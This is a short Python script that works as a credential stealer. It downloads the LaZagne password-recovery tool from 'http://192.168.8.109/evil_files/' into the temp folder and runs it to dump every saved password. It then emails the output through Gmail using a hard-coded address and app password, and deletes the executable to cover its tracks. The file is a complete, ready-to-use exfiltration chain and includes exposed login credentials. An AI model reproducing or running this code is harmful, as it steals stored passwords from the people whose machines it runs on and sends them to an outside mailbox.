import requests  # Import the requests module
import subprocess
import smtplib
import re
import os
import tempfile
def send_mail(email, password, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def download(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            file_name = url.split("/")[-1]
            with open(file_name, "wb") as file:
                file.write(response.content)
            return file_name
        else:
            return None
    except Exception as e:
        return None

def execute_command(command):
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, encoding='utf-8', errors='ignore')
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        print(f"Stderr: {e.stderr}")

# Use a temporary directory
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

# Download and execute
file_name = download("http://192.168.8.109/evil_files/LaZagne.exe")
if file_name and os.path.exists(file_name):
    print("File ready for execution.")
    result = execute_command(f"{file_name} all")
else:
    print("Execution skipped. File not found.")


send_mail("olivercrack098@gmail.com", "xotxwgjbgiymjobh", result)
os.remove("LaZagne.exe")



